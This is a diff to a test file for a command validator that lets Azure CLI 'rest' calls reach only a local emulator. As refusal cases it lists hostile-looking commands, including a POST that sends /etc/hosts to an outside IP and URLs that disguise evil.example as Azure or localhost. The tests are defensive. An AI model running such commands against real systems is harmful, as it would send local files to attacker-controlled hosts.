@@ -124,7 +124,7 @@ describe("evaluateAzCommand", () => {
     expect(allowed("rest -u https://management.azure.com").argv[2]).toBe("/");
   });
 
-  test("rest calls local hosts only: a file given as the body would go wherever the URL points", () => {
+  test("rest reaches only the emulator: a file given as the body would go wherever the URL points", () => {
     for (const command of [
       "rest --method post --url http://10.1.2.3:8080/x --body @/etc/hosts",
       "rest --uri=HTTP://evil.example/x",
@@ -134,12 +134,18 @@ describe("evaluateAzCommand", () => {
       "rest --url https://management.azure.com.evil.example/x",
       "rest --url https://localhost@evil.example/x",
     ]) {
-      expect(refusal(command).title).toBe("URL not allowed");
+      expect(refusal(command).message).toContain("is not the emulator");
+    }
+    // The egress guard relays https only, so plain http to the emulator is refused up front.
+    for (const command of [
+      "rest --url http://localhost:4566/_localstack/health",
+      "rest --url http://127.0.0.1:2375/version",
+    ]) {
+      expect(refusal(command).message).toContain("The emulator is reached over https.");
     }
     for (const url of [
       "https://azure.localhost.localstack.cloud:4566/x",
-      "http://localhost:4566/_localstack/health",
-      "http://127.0.0.1:4566/x",
+      "https://localhost:4566/_localstack/health",
       "/subscriptions?api-version=2022-12-01",
       "//evil.example/x", // no scheme: az puts the emulator's endpoint before it
     ]) {
